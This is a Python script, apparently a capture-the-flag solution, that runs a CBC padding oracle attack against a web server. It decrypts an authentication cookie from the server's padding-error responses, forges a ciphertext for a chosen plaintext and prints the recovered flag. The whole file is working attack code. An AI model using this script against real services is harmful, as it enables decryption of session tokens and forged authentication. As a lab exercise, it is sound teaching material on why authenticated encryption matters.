#!/usr/bin/env python3

# CBC padding oracle attack
# - lenerd

import requests
import sys
import cbc_oracle_attack
from Crypto.Util.Padding import pad
from secrets import token_bytes


def get_cookie(base_url):
    """Gets an authentication token from the chosen server"""
    res = requests.get(f'{base_url}/')
    cookie = res.cookies.get('authtoken')
    iv = cookie[0:32]
    ct = cookie[32:]
    return iv, ct


def make_oracle_request(iv, block, base_url):
    """Makes an oracle request. Returns false is the padding is incorrect
    and true otherwise."""
    res = requests.get(f'{base_url}/quote/',
                       cookies={'authtoken': (iv + block).hex()})
    if 'padding is incorrect' in res.content.decode("utf-8").lower():
        return False
    else:
        return True


def cbc_r(msg: str, oracle):
    """Constructs a ciphertext of the chosen message."""
    msg = msg.encode()

    pt = pad(msg, 16)
    pt_blocks = [pt[i:i+cbc_oracle_attack.BLOCK_SIZE]
                 for i in range(0, len(pt), cbc_oracle_attack.BLOCK_SIZE)]

    # random block
    ct_prev = token_bytes(16)
    target_ct = ct_prev
    for i in reversed(range(1, len(pt_blocks))):
        ct_curr = bytes(a ^ b for a, b in zip(
            pt_blocks[i], cbc_oracle_attack.single_block_attack(ct_prev, oracle)))
        target_ct = ct_curr + target_ct
        ct_prev = ct_curr

    iv = bytes(a ^ b for a, b in zip(
        pt_blocks[0], cbc_oracle_attack.single_block_attack(ct_prev, oracle)))

    return iv + target_ct


if __name__ == '__main__':
    if len(sys.argv) != 2:
        print(f'usage: {sys.argv[0]} <base url>', file=sys.stderr)
        exit(1)
    addr = sys.argv[1]
    def oracle(iv, ct): return make_oracle_request(iv, ct, addr)

    # 1. Get the secret

    # Get the authentication cookie and run a padding oracle attack
    # to recover the secret
    iv, ct = get_cookie(addr)
    iv, ct = (bytes.fromhex(iv), bytes.fromhex(ct))
    secret = cbc_oracle_attack.full_attack(iv, ct, oracle)
    print(secret)

    # 2. Run a reverse padding oracle attack so we can
    #    construct a ciphertext for our chosen plaintext

    # secret = "I should have used authenticated encryption because ..."
    SUFFIX = " plain CBC is not secure!"
    ct: bytes = cbc_r(secret + SUFFIX, oracle)
    print(ct.hex())

    # 3. Send the ciphertext to the server to recover the quote
    quote = requests.get(f'{addr}/quote/', cookies={'authtoken': ct.hex()})
    print(quote.content)

    # Quote is:
    # b'<quote>\nflag{tH15_0r4cL3_t31l5_y0u_7O_u53_4u7h3Nt1c4T3d_3NcrYpT10n}\n</quote>'
    # "this oracle tells you to use authenticated encryption"
